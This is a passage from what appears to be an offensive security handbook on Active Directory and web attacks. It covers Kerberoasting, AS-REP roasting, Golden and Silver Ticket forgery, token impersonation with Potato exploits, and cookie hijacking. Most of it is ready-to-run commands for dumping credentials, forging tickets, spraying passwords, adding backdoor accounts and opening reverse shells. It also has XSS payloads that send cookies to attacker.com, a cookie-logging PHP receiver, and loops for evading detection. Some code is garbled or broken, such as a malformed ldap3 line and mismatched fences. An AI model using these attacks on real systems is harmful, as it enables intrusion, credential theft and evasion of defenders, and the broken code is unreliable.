impacket-GetUserSPNs DOMAIN.LOCAL/Administrator -use-kcache -request
```

[Inference] Unconstrained delegation systems cache high-privilege TGTs enabling Kerberoasting under administrative context, potentially accessing restricted SPNs unavailable to standard users.

**Kerberoasting with Constrained Delegation**

Exploit S4U2Proxy for service delegation impersonation:

```bash
# Identify services with constrained delegation
ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "msDS-AllowedToDelegateTo=*" sAMAccountName

# Create S4U2 ticket for delegation target
impacket-getST -spn cifs/server DOMAIN/serviceaccount:password@<DC> -impersonate Administrator

# Use impersonated ticket for lateral movement
export KRB5CCNAME=./Administrator.ccache
```

[Inference] Constrained delegation exploitation enables impersonation of specific accounts for targeted services, potentially enabling privilege escalation when delegation is misconfigured to include administrative services.

**Kerberoasting Large Scale Enumeration**

Perform comprehensive SPN enumeration and ticket extraction:

```bash
# Extract all SPNs from domain
impacket-GetUserSPNs DOMAIN.LOCAL/user:password -all -request -outputfile all_hashes.txt

# Parallel processing for efficiency
cat all_hashes.txt | parallel --pipe --block 10M 'hashcat -m 13100 - wordlist.txt'

# Statistics on extracted tickets
grep -o "krb5tgs" all_hashes.txt | wc -l
```

[Inference] Large-scale Kerberoasting targeting entire domain SPN inventories enables identification of weak service account passwords across infrastructure, though [Unverified] mass ticket extraction may trigger detection systems monitoring unusual ticket request volumes.

---

## AS-REP Roasting

AS-REP Roasting attacks extract pre-authentication hashes from user accounts configured with pre-authentication disabled, enabling offline password cracking without requiring Kerberos TGTs.

**Pre-Authentication Disabled Accounts Discovery**

Identify accounts vulnerable to AS-REP Roasting:

```bash
# Query LDAP for disabled pre-authentication
ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Using GetNPUsers.py (Impacket)
impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile userlist.txt

# Query specific users
impacket-GetNPUsers -dc-ip <DC-IP> DOMAIN.LOCAL/user:password

# Enumerate via SMB
enum4linux -U <DC> | grep "Pre-Auth"
```

[Inference] Users with pre-authentication disabled (UserAccountControl flag 0x400000) skip the KDC pre-authentication step, enabling attackers to request authentication responses without providing credentials for offline cracking.

**AS-REP Hash Extraction**

Extract authentication response hashes:

```bash
# Using GetNPUsers.py
impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile userlist.txt -format john

# Output format for cracking tools
cat hashes.txt
# $krb5asrep$23$user@DOMAIN.LOCAL:$[hash_material]

# Query without credentials
impacket-GetNPUsers -dc-ip <DC-IP> DOMAIN.LOCAL/ -usersfile userlist.txt -no-pass
```

AS-REP response format analysis:

```
$krb5asrep$[encryption_type]$[user]@[domain]:[response_hash]
Encryption types: 23 (RC4), 17 (AES128), 18 (AES256)
```

[Inference] AS-REP hashes contain encryption material from user passwords, enabling offline brute-force attacks through repeated hashing and comparison against known plaintext structures in legitimate Kerberos responses.

**Offline AS-REP Hash Cracking**

Crack extracted hashes to recover user passwords:

```bash
# Using Hashcat
hashcat -m 18200 hashes.txt wordlist.txt
hashcat -m 18200 hashes.txt wordlist.txt --show

# Using John the Ripper
john --format=krb5asrep hashes.txt --wordlist=wordlist.txt
john --format=krb5asrep hashes.txt --show

# GPU acceleration
hashcat -m 18200 hashes.txt wordlist.txt -d 1 --workload-profile 4
```

[Inference] AS-REP cracking success rates typically exceed Kerberoasting due to user account passwords being generally weaker than service account passwords and less likely to have complexity enforcement.

**Pre-Authentication Disabled Account Discovery at Scale**

Enumerate vulnerable accounts across entire domain:

```bash
# Mass enumeration
impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile /dev/stdin << 'EOF' -format john
user1
user2
user3
EOF

# Domain-wide enumeration (requires valid credentials)
impacket-GetNPUsers -dc-ip <DC-IP> DOMAIN.LOCAL/admin:password | tee asrep_hashes.txt

# Query via custom script
python3 << 'EOF'
from ldap3 import Server, Connection
server = Server('ldap://<DC>')
conn = Connection(server,conn = Connection(server, user='DOMAIN\user', password='password') 
conn.bind() 
conn.search('dc=DOMAIN,dc=LOCAL', '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes=['sAMAccountName']) 

for entry in conn.entries: 
	print(entry.sAMAccountName.value) EOF
````

[Inference] Domain-wide AS-REP enumeration reveals configuration weaknesses where administrative accounts or service accounts have pre-authentication disabled, increasing password cracking attack surface.

**AS-REP Roasting with User Enumeration**

Combine AS-REP attacks with user enumeration:

```bash
# Generate user list from RID cycling
impacket-lookupsid DOMAIN.LOCAL/user:password@<DC> | grep "User:" > userlist.txt

# Extract AS-REP hashes for enumerated users
impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile userlist.txt -format john -outputfile asrep_hashes.txt

# Combine with Kerberoasting for comprehensive credential attack
impacket-GetUserSPNs DOMAIN.LOCAL/user:password -request -outputfile spn_hashes.txt
````

[Inference] Combined enumeration and extraction attacks identify both AS-REP vulnerable accounts and Kerberoastable service accounts, maximizing offline cracking opportunities.

**Custom AS-REP Exploitation Tools**

Develop targeted AS-REP implementations:

```bash
# Custom extraction without Impacket
python3 << 'EOF'
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5 import constants

# Request AS-REP for user without pre-auth
username = "targetuser"
domain = "DOMAIN.LOCAL"
kdc_ip = "<DC-IP>"

# Build AS-REQ without pre-authentication
# Process response to extract hash material
EOF

# Alternative using direct KDC queries
nc -u <DC-IP> 88 < as_req_packet.bin > as_rep_response.bin
```

[Unverified] Custom implementations enable targeted AS-REP attacks focusing on specific user accounts or organizational units while potentially avoiding standard detection signatures.

**AS-REP Detection and Evasion**

Identify AS-REP Roasting activity through logging:

```
Event ID 4768 (Kerberos Authentication Ticket Requested) with encryption type mismatch
Multiple AS-REQ requests for users with pre-authentication disabled
KRBTGT response generation for disabled pre-auth users
```

Evade detection through:

```bash
# Query during off-hours to blend with legitimate activity
# Space out user enumeration over extended periods
# Use legitimate user credentials for queries
# Combine with other credential attacks to obscure intent

# Timing distribution
for user in $(cat userlist.txt); do
    impacket-GetNPUsers DOMAIN.LOCAL/$user -no-pass -format john
    sleep $((RANDOM % 60 + 30))  # 30-90 second delays
done
```

[Inference] AS-REP evasion exploits event log analysis limitations where pre-authentication requests appear legitimate when distributed across extended timeframes, though [Unverified] behavioral detection systems may identify unusual per-user query patterns.

**AS-REP Roasting with Encrypted Traffic Analysis**

Exploit weak encryption algorithms in AS-REP responses:

```bash
# Capture Kerberos traffic
tcpdump -i eth0 -w kerberos.pcap "udp port 88"

# Extract AS-REP responses
tshark -r kerberos.pcap -Y "kerberos.msg_type == 11" -T json > as_rep_packets.json

# Analyze encryption types
jq '.[] | select(.kerberos) | .kerberos | .enc_part.etype' as_rep_packets.json
```

[Unverified] Weak encryption algorithms in AS-REP responses (RC4/type 23) enable [Inference] faster offline cracking compared to AES encryption, though modern Windows defaults prefer AES encryption when available.

**AS-REP Password Spraying Integration**

Combine AS-REP attacks with password spray for initial compromise:

```bash
# Password spray against AS-REP vulnerable accounts
impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile userlist.txt -format john &

# Parallel password spray
for password in "Winter2024!" "Password123" "Company2024"; do
    impacket-GetNPUsers -dc-ip <DC-IP> DOMAIN.LOCAL/ -usersfile userlist.txt -format john -passwords "$password"
done
```

[Inference] Integrated attacks combine information gathering (AS-REP vulnerable account identification) with credential attacks (password spraying or hash cracking), maximizing initial compromise probability.

**AS-REP with Machine Account Abuse**

Exploit machine accounts with pre-authentication disabled:

```bash
# Identify computer accounts with disabled pre-auth
ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Extract AS-REP for machine account
impacket-GetNPUsers DOMAIN.LOCAL/ -usersfile computer_accounts.txt -format john

# Crack machine account hash (typically predictable)
hashcat -m 18200 machine_hashes.txt wordlist.txt
```

[Inference] Machine account AS-REP exploitation enables lateral movement when machine account passwords are predictable or discoverable through other means.

---

## Golden Ticket Attacks

Golden Ticket attacks forge domain-wide Kerberos Ticket-Granting Tickets (TGTs) using the Krbtgt account password hash, enabling persistent administrative access to any domain resource regardless of subsequent password changes.

**Krbtgt Hash Extraction**

Extract Krbtgt password hash from domain controller:

```bash
# Using secretsdump on domain controller
impacket-secretsdump -dc-ip <DC-IP> DOMAIN.LOCAL/admin:password@<DC>

# Extract from SAM/SYSTEM hives
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# Extract via VSS (Volume Shadow Copy)
impacket-secretsdump -use-vss DOMAIN.LOCAL/admin:password@<DC>

# NTDS.DIT extraction
esentutl /y /vss
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

Krbtgt account identification:

```bash
# Locate Krbtgt in domain
ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "sAMAccountName=krbtgt" objectSid

# Query via RID (typically RID 502)
impacket-lookupsid DOMAIN.LOCAL/user:password@<DC> | grep "RID 502"
```

[Inference] Krbtgt hash extraction requires domain controller administrative access or volume shadow copy access, representing a critical security boundary where compromise enables persistent domain-wide persistence.

**Golden Ticket Creation**

Forge domain-wide TGTs using Krbtgt hash:

```bash
# Using Mimikatz
mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:golden.kirbi

# Alternative syntax with specific parameters
mimikatz # kerberos::golden /user:FakeAdmin /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:golden.kirbi /startoffset:0 /endin:600 /renewmax:10080

# Using impacket-ticketer
impacket-ticketer -nthash <KrbtgtHash> -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain DOMAIN.LOCAL -user Administrator golden.ccache
```

Golden Ticket parameters:

```
/user: Forged username (arbitrary, typically Administrator)
/domain: Domain name (FQDN or NetBIOS)
/sid: Domain SID (S-1-5-21-X-X-X)
/krbtgt: Krbtgt account NTLM hash
/ticket: Output ticket filename
/startoffset: Offset from current time (negative = past)
/endin: Ticket lifetime in minutes (default 600)
/renewmax: Renewal window in minutes (default 10080)
```

[Inference] Golden Ticket creation requires only Krbtgt hash and domain parametersâ€”no KDC interaction occurs, enabling offline ticket generation and use on completely isolated networks.

**Domain SID Extraction**

Obtain Domain SID for Golden Ticket creation:

```bash
# Query via LDAP
ldapsearch -H ldap://<DC> -x -b "dc=DOMAIN,dc=LOCAL" "(objectClass=domain)" objectSid

# Using impacket-lookupsid
impacket-lookupsid DOMAIN.LOCAL/user:password@<DC>

# Query via RPC
rpcclient -U "DOMAIN\user%password" <DC> -c "querydispinfo"

# From compromise system registry
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History" /v DomainName
```

SID format validation:

```bash
# Verify SID format
echo "S-1-5-21-1234567890-1234567890-1234567890" | grep -E "S-1-5-21-[0-9]+-[0-9]+-[0-9]+$"
```

[Inference] Domain SID availability through LDAP queries without authentication makes SID extraction trivial even in hardened environments.

**Golden Ticket Injection and Use**

Inject forged tickets for domain access:

```bash
# Inject ticket (Windows)
mimikatz # kerberos::ptt golden.kirbi
klist

# Inject ticket (Linux)
export KRB5CCNAME=/tmp/golden.ccache
kinit -c /tmp/golden.ccache --keytab=golden.ccache Administrator@DOMAIN.LOCAL

# Verify injection
klist -c /tmp/golden.ccache
```

Access domain resources with injected ticket:

```bash
# SMB share access
smbclient //<SERVER>/c$ --use-kerberos=required -k

# Remote command execution via WinRM
crackmapexec winrm <target> -u Administrator --use-kcache

# LDAP queries
ldapsearch -H ldap://<DC> -Y GSS-SPNEGO -b "dc=DOMAIN,dc=LOCAL"
```

[Inference] Injected Golden Tickets function identically to legitimate domain tickets, enabling seamless access to all domain resources where Kerberos authentication is accepted.

**Persistence via Golden Tickets**

Establish persistent domain access:

```bash
# Create Golden Ticket with extended lifetime
mimikatz # kerberos::golden /user:HiddenAdmin /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:persistence.kirbi /endin:35791394 /renewmax:35791394

# Export ticket for repeated use
# Copy persistence.kirbi to offline storage or schedule re-injection

# Automated re-injection via scheduled task
# Task runs: mimikatz kerberos::ptt persistence.kirbi
```

[Unverified] Golden Ticket persistence remains valid as long as the Krbtgt hash remains unchanged, providing [Inference] persistent domain access independent of password changes or account disablement, though [Unverified] specific persistence duration depends on Kerberos policy configuration and ticket renewal limits.

**Golden Ticket Detection and Mitigation**

Identify Golden Ticket usage through logging:

```
Event ID 4768 (Kerberos TGT Requested) with unusual user/computer combinations
Event ID 4769 (Kerberos Service Ticket Requested) from unexpected sources
TGTs with impossible logon paths (user logged in from multiple locations simultaneously)
Forged user accounts in TGT (non-existent users accessing resources)
```

Evade detection through:

```bash
# Use legitimate domain user accounts
# Inject tickets during normal business hours
# Distribute ticket usage across multiple systems
# Use realistic user-to-resource access patterns

# Timing distribution
for i in {1..100}; do
    mimikatz # kerberos::ptt golden.kirbi
    crackmapexec smb <target-range> -u HiddenAdmin --use-kcache --continue-on-success
    sleep $((RANDOM % 3600 + 1800))  # 30-90 minute delays
done
```

[Inference] Golden Ticket evasion exploits detection limitations where legitimate Kerberos events show ticket usage but distinguishing forged tickets from authentic ones requires behavioral analysis and cross-resource correlation.

**Krbtgt Password Change Implications**

Understand Krbtgt rotation impact on Golden Tickets:

```bash
# Krbtgt password change invalidates all Golden Tickets
# Domain requires new Krbtgt hash for ticket forgery

# However, Krbtgt has two password hashes during rotation:
# - Previous hash (old tickets remain valid temporarily)
# - Current hash (new tickets use current)

# Extract both hashes
impacket-secretsdump -dc-ip <DC-IP> DOMAIN.LOCAL/admin:password@<DC> | grep krbtgt

# Create Golden Tickets with both hashes for continuity
mimikatz # kerberos::golden /krbtgt:<OldHash> /ticket:golden_old.kirbi
mimikatz # kerberos::golden /krbtgt:<CurrentHash> /ticket:golden_new.kirbi
```

[Inference] Krbtgt rotation policies requiring regular password changes limit Golden Ticket persistence, though attackers with repeated domain controller access can maintain persistence through continuous Krbtgt hash extraction and ticket regeneration.

**Silver vs. Golden Ticket Comparison**

Distinguish ticket types for exploitation:

```
Golden Ticket: Forged TGT signed by Krbtgt
- Access: Any domain resource
- Requires: Krbtgt hash, domain SID
- Creation: Offline, no KDC interaction
- Detection: Difficult (legitimate-appearing tickets)
- Scope: Domain-wide

Silver Ticket: Forged service ticket signed by service account
- Access: Specific service only
- Requires: Service account hash
- Creation: Offline, per-service
- Detection: Service-specific log analysis
- Scope: Single service/server
```

[Inference] Golden Tickets provide broader persistence and access compared to Silver Tickets, making them preferable for sustained compromise when Krbtgt hash is available.

**Golden Ticket with Constrained Delegation**

Exploit delegation for cross-service access:

```bash
# Create Golden Ticket for service account with delegation
mimikatz # kerberos::golden /user:ServiceAccount /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:delegation.kirbi

# Service account TGT enables S4U2Proxy delegation
# Request service tickets for delegated targets
impacket-getST -use-kcache -spn cifs/server.domain.local
```

[Inference] Golden Tickets combined with constrained delegation enable impersonation of arbitrary users for services configured in delegation ACLs, providing privilege escalation paths beyond direct ticket usage.

**Golden Ticket Forensic Identification**

Detect Golden Ticket artifacts during incident response:

```bash
# Check injected tickets
klist

# Examine Kerberos cache files
file /tmp/krb5cc_*
ls -la /tmp/krb5cc_*

# Check event logs for impossible scenarios
wevtutil qe Security /q:"Event[System[(EventID=4768)]] and Event[EventData[Data[@Name='TargetUserName']='HiddenAdmin']]"

# Search for ticket files (Mimikatz .kirbi exports)
find / -name "*.kirbi" 2>/dev/null
```

[Inference] Golden Ticket forensics focus on behavioral anomalies rather than ticket authenticity verification, as forged tickets cryptographically appear legitimate to domain systems.

**Alternative Golden Ticket Creation Methods**

Generate tickets through alternative mechanisms:

```bash
# Using custom Python
python3 << 'EOF'
from impacket.krb5 import constants
from impacket.krb5.asn1 import *
# Construct TGT structure
# Sign with Krbtgt hash
# Export as .kirbi or .ccache
EOF

# Using rubeus (C# tool)
Rubeus.exe golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<Hash> /ticket:golden.kirbi

# Using impacket with custom parameters
impacket-ticketer -nthash <KrbtgtHash> -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain DOMAIN.LOCAL -user Administrator -extra-sid S-1-5-21-1234567890-1234567890-1234567890-519 golden.ccache
```

[Unverified] Alternative ticket creation methods enable circumvention of specific tool-based detection, though underlying Kerberos ticket structure remains identical regardless of creation method.

**Golden Ticket with PAC Modification**

Inject privilege information into forged tickets:

```bash
# Golden Ticket with elevated PAC (Privilege Attribute Certificate)
mimikatz # kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<KrbtgtHash> /ticket:elevated.kirbi /groups:513,512,520,518,519

# Groups: 513=Domain Users, 512=Domain Admins, 520=Group Policy Admins, 518=Schema Admins, 519=Enterprise Admins

# PAC enables service-side privilege evaluation
# Injected group membership appears in service authorization checks
```

[Inference] PAC modification enables elevation of forged ticket privileges for administrative access, though specific privilege elevation depends on service-side PAC validation and authorization policies.

---

## Silver Ticket Attacks

### Concept Overview

Silver Ticket attacks involve forging Kerberos TGS (Ticket Granting Service) tickets using a service account's NTLM hash. Unlike Golden Tickets (which use the krbtgt hash), Silver Tickets target specific services and generate less suspicious activity.

### Prerequisites

- Service account NTLM hash (from secretsdump, Kerberoasting, or hashdump)
- Domain SID
- Target service SPN (Service Principal Name)
- Valid username to impersonate

### Extracting Required Information

**Obtain Domain SID**

```bash
# From Linux with Impacket
lookupsid.py domain.local/username:password@<DC-IP>

# From compromised Windows host
powershell -c "Get-ADDomain | Select-Object DomainSID"
whoami /user  # User SID, remove last RID for domain SID

# Using CrackMapExec
crackmapexec ldap <DC-IP> -u username -p password -M get-desc-users
```

**Obtain Service Account Hash**

```bash
# Kerberoasting to get service account hash
GetUserSPNs.py domain.local/username:password -dc-ip <DC-IP> -request

# Crack the hash
hashcat -m 13100 spn_hash.txt wordlist.txt

# Or from secretsdump
secretsdump.py domain.local/username:password@<target>
```

### Generating Silver Tickets

**Using Impacket ticketer.py**

```bash
# Basic silver ticket for CIFS service
ticketer.py -nthash <service_ntlm_hash> -domain-sid <domain_SID> -domain domain.local -spn cifs/target.domain.local <username>

# For specific services
# CIFS (file access)
ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn cifs/target.domain.local Administrator

# HTTP (web services)
ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn http/target.domain.local Administrator

# MSSQL
ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# LDAP (directory queries)
ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn ldap/dc.domain.local Administrator

# With additional options
ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn cifs/target.domain.local \
    -user-id 500 -groups 512,513,518,519,520 Administrator
```

**Common Group IDs**

- 512: Domain Admins
- 513: Domain Users
- 518: Schema Admins
- 519: Enterprise Admins
- 520: Group Policy Creator Owners

### Using Silver Tickets

**Export Ticket on Linux**

```bash
# Set environment variable
export KRB5CCNAME=/path/to/Administrator.ccache

# Verify ticket
klist

# Use with Impacket tools
psexec.py -k -no-pass domain.local/Administrator@target.domain.local
smbexec.py -k -no-pass domain.local/Administrator@target.domain.local
wmiexec.py -k -no-pass domain.local/Administrator@target.domain.local
secretsdump.py -k -no-pass domain.local/Administrator@target.domain.local
```

**Ticket Injection on Windows (Mimikatz)**

```powershell
# Generate silver ticket with Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:<domain_SID> /target:target.domain.local /service:cifs /rc4:<service_ntlm_hash> /ptt

# Verify injection
klist

# Access resource
dir \\target.domain.local\c$
```

**Using Rubeus**

```powershell
# Create and inject silver ticket
Rubeus.exe silver /service:cifs/target.domain.local /rc4:<hash> /sid:<domain_SID> /user:Administrator /ptt

# Create ticket file
Rubeus.exe silver /service:cifs/target.domain.local /rc4:<hash> /sid:<domain_SID> /user:Administrator /outfile:ticket.kirbi

# Import existing ticket
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Service-Specific Silver Tickets

**CIFS/SMB Service**

```bash
# Generate
ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn cifs/target.domain.local Administrator

# Use
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass domain.local/Administrator@target.domain.local
```

**HOST Service (PSExec, WMI, Scheduled Tasks)**

```bash
# Generate
ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn host/target.domain.local Administrator

# Use
psexec.py -k -no-pass domain.local/Administrator@target.domain.local
```

**MSSQL Service**

```bash
# Generate
ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# Use
mssqlclient.py -k -no-pass domain.local/Administrator@target.domain.local
```

**WinRM/HTTP Service**

```bash
# Generate
ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn http/target.domain.local Administrator

# Use with evil-winrm
evil-winrm -i target.domain.local -r domain.local
```

### Detection Evasion Considerations

**[Inference]** Silver tickets may avoid detection better than Golden tickets because:

- They don't require DC compromise
- They target specific services rather than domain-wide access
- They generate fewer authentication events
- Lifetime can be limited to reduce exposure window

**Customization for Stealth**

```bash
# Specify realistic ticket lifetime (default is 10 years - suspicious)
ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local \
    -spn cifs/target.domain.local -duration 720 Administrator  # 30 days

# Match existing user attributes
ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local \
    -spn cifs/target.domain.local -user-id <RID> -groups <group_RIDs> username
```

---

## Token Impersonation

### Windows Access Token Overview

Windows access tokens contain security context information including user identity, group memberships, and privileges. Token impersonation allows processes to execute with different security contexts.

### Token Types

- **Primary Token**: Represents process security context
- **Impersonation Token**: Temporary token for thread-level impersonation
    - SecurityAnonymous: No impersonation
    - SecurityIdentification: Query only
    - SecurityImpersonation: Impersonate on local system
    - SecurityDelegation: Impersonate across network

### Privilege Requirements

**SeImpersonatePrivilege**

```powershell
# Check current privileges
whoami /priv

# Common accounts with SeImpersonate
# - IIS AppPool accounts
# - SQL Server service accounts
# - Local Service / Network Service
```

### Token Enumeration

**Using Incognito (Metasploit/Meterpreter)**

```bash
# From Meterpreter session
meterpreter > load incognito
meterpreter > list_tokens -u  # List user tokens
meterpreter > list_tokens -g  # List group tokens

# Impersonate token
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Verify
meterpreter > getuid
```

**PowerShell Token Enumeration**

```powershell
# Using PowerView
Get-Process | Select-Object Name,Id | ForEach-Object {
    $proc = Get-Process -Id $_.Id -ErrorAction SilentlyContinue
    if($proc) {
        $token = $proc.Handle
        # Additional token inspection code
    }
}
```

### Potato Exploits (Local Privilege Escalation)

**JuicyPotato** (Windows Server 2016, Windows 10 1809+)

```powershell
# Basic usage
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\output.txt" -t *

# With CLSID
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker P@ssw0rd /add" -t * -c {CLSID}

# Common CLSIDs for different Windows versions
# Windows 10 Enterprise: {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
# Windows Server 2019: {90EE9BB9-7957-4DC1-9E6E-2C0A5F1A64E4}

# Reverse shell
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -nop -w hidden -e <base64_payload>" -t * -c {CLSID}
```

**RoguePotato** (Windows 10 1809+, Server 2019+)

```powershell
# Setup listener on attacking machine
socat tcp-listen:135,reuseaddr,fork tcp:<target_IP>:9999

# Execute on target
RoguePotato.exe -r <attacker_IP> -e "cmd.exe /c whoami" -l 9999
```

**PrintSpoofer** (Universal - works on latest Windows)

```powershell
# Interactive shell
PrintSpoofer.exe -i -c cmd

# Execute specific command
PrintSpoofer.exe -c "whoami"

# Reverse shell
PrintSpoofer.exe -c "powershell -nop -w hidden -e <base64_payload>"
```

**GodPotato** (Windows Server 2012 - Server 2022)

```powershell
# Basic execution
GodPotato.exe -cmd "cmd /c whoami"

# Add user
GodPotato.exe -cmd "cmd /c net user hacker P@ssw0rd /add"
GodPotato.exe -cmd "cmd /c net localgroup administrators hacker /add"
```

### Token Manipulation with Mimikatz

**Basic Token Operations**

```powershell
# List available tokens
token::list

# Elevate to SYSTEM token
token::elevate

# Impersonate specific user
token::elevate /user:Administrator

# Revert to original token
token::revert
```

**Credential Theft from Tokens**

```powershell
# Dump credentials from current process
sekurlsa::logonpasswords

# Dump credentials from specific process
sekurlsa::process /pid:<PID>
```

### Token Impersonation via PowerShell

**Invoke-TokenManipulation** (PowerSploit)

```powershell
# Import module
Import-Module .\Invoke-TokenManipulation.ps1

# List available tokens
Invoke-TokenManipulation -ShowAll

# Impersonate token
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Administrator"

# Create process with token
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "DOMAIN\Administrator"

# Enumerate processes with tokens
Invoke-TokenManipulation -Enumerate
```

### Token Impersonation from Linux

**Impacket with Ticket Injection**

```bash
# After obtaining TGT/TGS ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Execute commands with impersonated context
psexec.py -k -no-pass domain.local/Administrator@target.domain.local

# WMI execution
wmiexec.py -k -no-pass domain.local/Administrator@target.domain.local
```

### Named Pipe Impersonation

**Creating Malicious Named Pipe**

```powershell
# C# code concept for named pipe impersonation
# Requires compilation to executable

# Create named pipe server that captures tokens
$pipe = new-object System.IO.Pipes.NamedPipeServerStream('\\.\pipe\testpipe', 'InOut', 1, 'Byte', 'None', 4096, 4096)
$pipe.WaitForConnection()

# Trigger privileged connection to pipe
# Then impersonate connected client token
```

---

## Cookie Hijacking

### Session Cookie Fundamentals

**Common Cookie Attributes**

- `HttpOnly`: Prevents JavaScript access (XSS mitigation)
- `Secure`: Only transmitted over HTTPS
- `SameSite`: CSRF protection (Strict/Lax/None)
- `Domain`: Cookie scope
- `Path`: URL path scope
- `Expires/Max-Age`: Cookie lifetime

### Cookie Extraction Methods

**Browser Developer Tools**

```javascript
// In browser console
document.cookie

// Extract specific cookie
document.cookie.split(';').find(c => c.includes('session'))

// Copy all cookies formatted
copy(document.cookie)
```

**Browser Extension: Cookie-Editor**

```
1. Install Cookie-Editor extension
2. Navigate to target site
3. Click extension icon
4. Export cookies as JSON/Netscape format
```

**EditThisCookie Chrome Extension**

```
1. Install EditThisCookie
2. Click extension icon
3. Export cookies
4. Import on attacker browser
```

### Network-Based Cookie Capture

**Wireshark HTTP Cookie Filter**

```
http.cookie or http.set_cookie
http.cookie contains "session"
```

**tcpdump Cookie Capture**

```bash
# Capture HTTP traffic with cookies
tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# Filter for Cookie header
tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -i cookie
```

**Bettercap Cookie Sniffing**

```bash
# Start bettercap
bettercap -iface eth0

# Enable HTTP/HTTPS proxy
> set http.proxy.sslstrip true
> set http.proxy.script /path/to/cookie_capture.js
> http.proxy on

# ARP spoofing for MITM
> set arp.spoof.targets <target_IP>
> arp.spoof on
```

### XSS-Based Cookie Theft

**Basic XSS Cookie Stealer**

```javascript
// Simple exfiltration to attacker server
<script>
new Image().src='http://attacker.com/steal.php?c='+document.cookie;
</script>

// URL encoded version
<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>

// Using XMLHttpRequest
<script>
var xhr=new XMLHttpRequest();
xhr.open('GET','http://attacker.com/?c='+document.cookie,true);
xhr.send();
</script>
```

**Advanced Cookie Exfiltration**

```javascript
// Exfiltrate all storage mechanisms
<script>
var data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
};
fetch('http://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
});
</script>
```

**XSS Hunter Integration**

```javascript
<script src="https://xss.hunter.domain/payload.js"></script>
```

**Receiver Script (steal.php)**

```php
<?php
$cookie = $_GET['c'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$log = "[$time] IP: $ip | Cookie: $cookie\n";
file_put_contents('cookies.txt', $log, FILE_APPEND);
?>
```

### HTTPOnly Bypass Techniques

**[Inference]** HTTPOnly cookies cannot be accessed via JavaScript, but may be leaked through:

**TRACE/TRACK Method Exploitation**

```javascript
// If TRACE method is enabled (rare)
var xhr = new XMLHttpRequest();
xhr.open('TRACE', '/', false);
xhr.send();
// Response includes all headers including cookies
```

**Session Hijacking via XSS Without Cookie Access**

```javascript
// Perform actions as victim without stealing cookie
<script>
// Example: Change password
fetch('/change_password', {
    method: 'POST',
    credentials: 'include',  // Include cookies
    body: 'new_password=attacker_password'
});
</script>
```

### Cookie Injection and Manipulation

**Burp Suite Cookie Manipulation**

```
1. Intercept request in Proxy
2. Modify cookie values in HTTP headers
3. Forward request

# Example modification
Cookie: session=victim_session_token; admin=true
```

**cURL Cookie Injection**

```bash
# Send request with specific cookies
curl -b "session=stolen_token" http://target.com/admin

# Send multiple cookies
curl -b "session=token; role=admin" http://target.com

# Save response cookies
